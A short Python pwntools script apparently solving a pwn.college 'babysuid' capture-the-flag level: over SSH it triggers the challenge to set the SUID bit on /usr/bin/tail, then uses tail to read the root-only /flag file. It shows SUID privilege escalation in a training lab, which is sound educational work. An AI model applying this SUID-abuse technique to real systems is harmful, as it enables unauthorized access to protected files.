from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level4 to make /usr/bin/tail SUID
s.process("/challenge/babysuid_level4")

# Now run /usr/bin/tail /flag
log.success(
    s.process(
        [
            "/usr/bin/tail",
            "/flag",
        ]
    )
    .recvall()
    .decode()
    .strip()
)

# Close the SSH connection
s.close()
